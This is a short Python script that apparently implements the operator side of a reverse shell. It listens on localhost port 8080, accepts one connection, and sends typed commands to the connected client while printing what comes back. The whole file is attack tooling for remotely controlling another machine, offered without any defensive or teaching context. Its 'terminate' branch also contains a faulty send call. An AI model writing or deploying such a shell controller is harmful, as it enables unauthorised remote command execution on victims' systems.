import socket

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket object
    s.bind(("127.0.0.1",8080)) #bind to the socket
    s.listen(1) #listen for 1 connection
    conn, addr = s.accept() #accept and put the connection and the address in vars
    print("Connected from -> {}".format(addr)) #print the clients

    while True:
        command = input("Shell -> ") #command to be sent
        if "terminate" in command: #if terminate send the command and close conn
            conn.send(b'terminate',"utf8")
            conn.close()
            break
        else: #else sent the command in bytes/utf8 encoding
            conn.send(bytes(command,"utf8"))
            print(conn.recv(1024)) #print what the command returns

def main():
    connect()
main()
